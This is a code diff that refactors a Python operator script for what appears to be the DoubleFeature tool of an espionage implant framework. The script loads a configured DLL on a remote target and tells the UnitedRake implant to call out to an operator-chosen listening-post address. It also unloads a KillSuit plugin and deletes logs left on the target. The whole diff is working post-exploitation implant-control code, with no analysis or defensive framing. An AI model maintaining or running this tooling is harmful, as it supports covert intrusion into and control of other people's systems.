@@ -27,7 +27,7 @@ def main():
                 return False
         (key, logfile) = result
         isclean = False
-                
+
         while not isclean:
                 menuloop(key, logfile)
                 isclean = cleanup(logfile, g_debug_log)
@@ -35,16 +35,16 @@ def main():
         try:
                 if dsz.ui.Prompt("Would you like to report a problem with UR?", True):
                         problemStr = dsz.ui.GetString("Enter a description of the problem you are seeing:")
-                        dsz.cmd.Run("problem UnitedRake " + problemStr)
+                        dsz.cmd.Run(f"problem UnitedRake {problemStr}")
         except:
                 pass
-        
+
         return True
 
 def menuloop(key, logfile):
 
         dsz.ui.Echo("")
-        
+
         menuoption = -1
 
         #Need to do this temporary crap to handle 32 bit op boxes and 64 bit
@@ -52,25 +52,7 @@ def menuloop(key, logfile):
         if dsz.version.checks.IsOs64Bit() and not dsz.version.checks.IsOs64Bit(dsz.script.Env["local_address"]):
                 key = "badc0deb33ff00d"
                 while menuoption != 0:
-                        for i in (
-                                (""),
-                                (g_dfversion + " - temporary menu"),
-                                ("  Encryption key: %s" % key),
-                                ("  Log file: %s" % logfile),
-                                (""),
-                                ("  0)  Exit"),
-                                (""),
-                                ("Setup"),
-                                (""),
-                                ("Normal Usage"),
-                                ("  1) Run Standard DF query"),
-                                ("  2) Enable UR Logging"),
-                                ("  3) Disable UR Logging"),
-                                ("  4) Check registry for special UR key"),
-                                (""),
-                                ("Advanced Usage"),
-                                ("  5) Run a DF3 dll you configured"),
-                                (""),):
+                        for i in ("", f"{g_dfversion} - temporary menu", f"  Encryption key: {key}", f"  Log file: {logfile}", "", "  0)  Exit", "", "Setup", "", "Normal Usage", "  1) Run Standard DF query", "  2) Enable UR Logging", "  3) Disable UR Logging", "  4) Check registry for special UR key", "", "Advanced Usage", "  5) Run a DF3 dll you configured", ""):
                                 dsz.ui.Echo(i)
                         menuoption = dsz.ui.GetInt("Enter menu option:", "0")
                         ret = None
@@ -84,36 +66,9 @@ def menuloop(key, logfile):
                                                 ret = action()
 
         else:
-        
+                
                 while menuoption != 0:
-                        for i in (
-                                (""),
-                                (g_dfversion),
-                                ("  Encryption key: %s" % key),
-                                ("  Log file: %s" % logfile),
-                                (""),
-                                ("  0)  Exit"),
-                                (""),
-                                ("Setup"),
-                                ("  1)  Change encryption key"),
-                                ("  2)  Change log file"),
-                                (""),
-                                ("Normal Usage"),
-                                ("  3)  Check registry for special UR key"),
-                                ("  4)  Run Standard DF query"),
-                                ("  5)  Tip-Off UR"),
-                                (""),
-                                ("Advanced Usage"),
-                                ("  6) Enable UR Debug Logging"),
-                                ("  7) Disable UR Debug Logging"),
-                                ("  8) Kick-start UR"),
-                                ("  9) Shutdown UR"),
-                                ("  10) Toggle FA Mode"),
-                                (""),
-                                ("God Mode"),
-                                ("  11) Run a DF3 dll you already configured"),
-                                ("  12) Manually configure DF. Still uses the above log file and key. Make sure you know what you're doing here"),
-                                (""),):
+                        for i in ("", g_dfversion, f"  Encryption key: {key}", f"  Log file: {logfile}", "", "  0)  Exit", "", "Setup", "  1)  Change encryption key", "  2)  Change log file", "", "Normal Usage", "  3)  Check registry for special UR key", "  4)  Run Standard DF query", "  5)  Tip-Off UR", "", "Advanced Usage", "  6) Enable UR Debug Logging", "  7) Disable UR Debug Logging", "  8) Kick-start UR", "  9) Shutdown UR", "  10) Toggle FA Mode", "", "God Mode", "  11) Run a DF3 dll you already configured", "  12) Manually configure DF. Still uses the above log file and key. Make sure you know what you're doing here", ""):
                                 dsz.ui.Echo(i)
                         menuoption = dsz.ui.GetInt("Enter menu option:", "0")
                         ret = None
@@ -200,8 +155,8 @@ def changekey(current):
                                 key = current
                                 break
                 if len(key) > 32:
-                        key = key[0:32]
-                        dsz.ui.Echo("Key truncated to 128-bits: %s" % key, dsz.WARNING)
+                        key = key[:32]
+                        dsz.ui.Echo(f"Key truncated to 128-bits: {key}", dsz.WARNING)
         return key
 
 def geturguid():
@@ -228,17 +183,17 @@ def manualconfigure(logfile, key):
         options = dsz.ui.GetString("Enter the string to configure DF with:")
 
         dsz.ui.Echo("Verify the options are correct before continuing. Incorrect options could cause adverse effects to the target!!", dsz.WARNING)
-        if dsz.ui.Prompt("Manual DoubleFeature Arguments: %s" % (options)):
+        if dsz.ui.Prompt(f"Manual DoubleFeature Arguments: {options}"):
                 runtool(options, logfile, key)
                 parselog(logfile, key)
 
 def urtipoff(logfile, key):
         lpip = dsz.ui.GetString("Enter LP address:")
         lpport = dsz.ui.GetString("Enter LP port:")
-        options = "-t%s:%s" % (lpip, lpport)
+        options = f"-t{lpip}:{lpport}"
 
         dsz.ui.Echo("Verify your LP address and port before continuing.", dsz.WARNING)
-        if dsz.ui.Prompt("Tip off UR to call out to %s:%s?" % (lpip, lpport)):
+        if dsz.ui.Prompt(f"Tip off UR to call out to {lpip}:{lpport}?"):
                 dfputid = runtool(options, logfile, key)
                 parselog(logfile, key)
 
@@ -335,7 +290,7 @@ def getlog(log):
 def setup():
         global g_dftool, g_dfconfiguretool, g_dfreader, g_dfrscfile, g_default_logfile, g_envdebug, g_debug_log
         dsz.control.echo.Off()
-        
+
         if not dsz.version.checks.IsWindows():
                 dsz.ui.Echo("DF requires Windows OS")
                 return None
@@ -346,7 +301,7 @@ def setup():
         if not DoDEMICheck():
                 dsz.ui.Echo("DEMI check failed")
                 return None
-        
+
         (windir, sysdir) = dsz.path.windows.GetSystemPaths()
         resdir = dsz.lp.GetResourcesDirectory()
 
@@ -354,7 +309,7 @@ def setup():
         logfile = g_default_logfile
         g_debug_log = "%s\\Temp\\~yh56816.tmp" % windir
         g_envdebug_l = "_DF_UR_DEBUG"
-        
+
         if not dsz.env.Check(g_envdebug_l):
                 dsz.env.Set(g_envdebug_l, "false")
 
@@ -363,11 +318,7 @@ def setup():
         else:
                 local_arch = "i386"
 
-        if(dsz.version.checks.IsOs64Bit()):
-                remote_arch = "x64"
-        else:
-                remote_arch = "i386"
-
+        remote_arch = "x64" if (dsz.version.checks.IsOs64Bit()) else "i386"
         local_os = "winnt"
         remote_os = "winnt"
         dfproj = "Df"
@@ -375,16 +326,16 @@ def setup():
         g_dfconfiguretool = "%s\\%s\\Tools\\%s-%s\\%s"%(resdir, dfproj, remote_arch, remote_os, g_dfconfiguretool)
         g_dfreader = "%s\\%s\\Tools\\%s-%s\\%s"%(resdir, dfproj, local_arch, local_os, g_dfreader)
         g_dfrscfile = "%s\\%s\\Tools\\%s-%s\\%s"%(resdir, dfproj, remote_arch, remote_os, g_dfrscfile)
-        
+
         key = hex(random.randint(0x10000000000000000000000000000000,0xffffffffffffffffffffffffffffffff))[2:-1]
-                
+
         return (key, logfile)
 
 def DoDEMICheck():
-        
+
         if dsz.cmd.Run("plugins", dsz.RUN_FLAG_RECORD):
             # got the list -- save the data
-               
+
                 names = dsz.cmd.data.Get("remote::plugin::name", dsz.TYPE_STRING)
                 ids = dsz.cmd.data.Get("remote::plugin::id", dsz.TYPE_INT)
 
@@ -393,26 +344,26 @@ def DoDEMICheck():
                 for i in range(len(names)):
                         if names[i] == "KillSuit_Implant":
                                 demiID = ids[i]
-                if demiID != 0:
-                        if dsz.ui.Prompt("DecibelMinute(kisu) is loaded on target? It must be unloaded prior to DF runs. Do that now? (Y/N)"):
-                                dsz.control.echo.On()
-                                if not dsz.cmd.Run("freeplugin -id %s"%demiID, dsz.RUN_FLAG_RECORD):
-                                        dsz.ui.Echo("Error freeing plugin! Are you currently connected? Disconnect and try again!", dsz.ERROR)
-                                        dsz.control.echo.Off()
-                                        return False
-                                else:
-                                        dsz.control.echo.Off()
-                                        return True
-                                
-                        else:
-                                return False
-                else:
+                if demiID == 0:
                         return True
 
-        # do something with the returned data
+                if not dsz.ui.Prompt(
+                    "DecibelMinute(kisu) is loaded on target? It must be unloaded prior to DF runs. Do that now? (Y/N)"
+                ):
+                        return False
+                dsz.control.echo.On()
+                if not dsz.cmd.Run(f"freeplugin -id {demiID}",
+                                   dsz.RUN_FLAG_RECORD):
+                        dsz.ui.Echo("Error freeing plugin! Are you currently connected? Disconnect and try again!", dsz.ERROR)
+                        dsz.control.echo.Off()
+                        return False
+                else:
+                        dsz.control.echo.Off()
+                        return True
+
         else:
-            dsz.ui.Echo("Running Plugins failed!")
-            return False
+                dsz.ui.Echo("Running Plugins failed!")
+                return False
 
         return False
 
@@ -425,7 +376,7 @@ def cleanup(logfile, debug_log):
                 dsz.ui.Echo("User chose to continue.", dsz.WARNING)
 
         filestoclean = []
-        
+
         if dsz.file.Exists(logfile):
                 if dsz.ui.Prompt("DoubleFeature log file is still on target. Remove it now?"):
                         if not dsz.cmd.Run('delete -file "%s"' % logfile):
@@ -442,7 +393,7 @@ def cleanup(logfile, debug_log):
                                 filestoclean += [g_debug_log]
                 else:
                         filestoclean += [g_debug_log]
-        
+
         if filestoclean != []:
                 dsz.ui.Echo("", dsz.WARNING)
                 dsz.ui.Echo("Files left on target! Either cleaning failed or user chose to skip.", dsz.WARNING)
@@ -459,23 +410,23 @@ def cleanup(logfile, debug_log):
 def runtool(options, logfile, key):
 
         if key is not None:
-                options = "-a %s %s" % (key, options)
+                options = f"-a {key} {options}"
         if (logfile != g_default_logfile):
-                options = "%s -p %s" % (options, logfile)
+                options = f"{options} -p {logfile}"
 
         configuredDllPath = configuredll(options)
 
         if not DoDEMICheck():
                 dsz.ui.Echo("DEMI check failed. Not running tool..", dsz.WARNING)
                 return
-                                
+
         dsz.ui.Echo("Ready to run tool...")
         dsz.lp.RecordToolUse("DoubleFeature", "3.3.0.3", options)
         dsz.control.echo.On()
-        dsz.cmd.Prompt('dllload -ordinal 1 -library %s'%(configuredDllPath))
+        dsz.cmd.Prompt(f'dllload -ordinal 1 -library {configuredDllPath}')
         dsz.control.echo.Off()
-        dsz.cmd.Run('local delete -file %s'%(configuredDllPath))
-        
+        dsz.cmd.Run(f'local delete -file {configuredDllPath}')
+
         dsz.ui.Echo("Finished.")
         
 
@@ -484,20 +435,17 @@ def configuredll(options):
 
         configureddllpath = g_dftool.replace(".unfinalized",
                                              ".configured")
-        dsz.cmd.Run("local copy %s %s"%(g_dftool,configureddllpath))
+        dsz.cmd.Run(f"local copy {g_dftool} {configureddllpath}")
 
-        f = open(g_dfrscfile, "wt")
-        f.write(options)
-        f.close()
-        
-        dsz.ui.Echo("Configuring the Dll with options: %s..."% (options))
+        with open(g_dfrscfile, "wt") as f:
+                f.write(options)
+        dsz.ui.Echo(f"Configuring the Dll with options: {options}...")
         dsz.cmd.Run('local run -redirect -command "%s cmpf 6 1104 %s %s"' %
                    (g_dfconfiguretool, configureddllpath, g_dfrscfile))
 
         return configureddllpath
 
 
-if __name__ == '__main__':
-        if (main() != True):
-                dsz.ui.Echo("Script aborted due to errors.", dsz.WARNING)
-                sys.exit(-1)
+if __name__ == '__main__' and (main() != True):
+        dsz.ui.Echo("Script aborted due to errors.", dsz.WARNING)
+        sys.exit(-1)
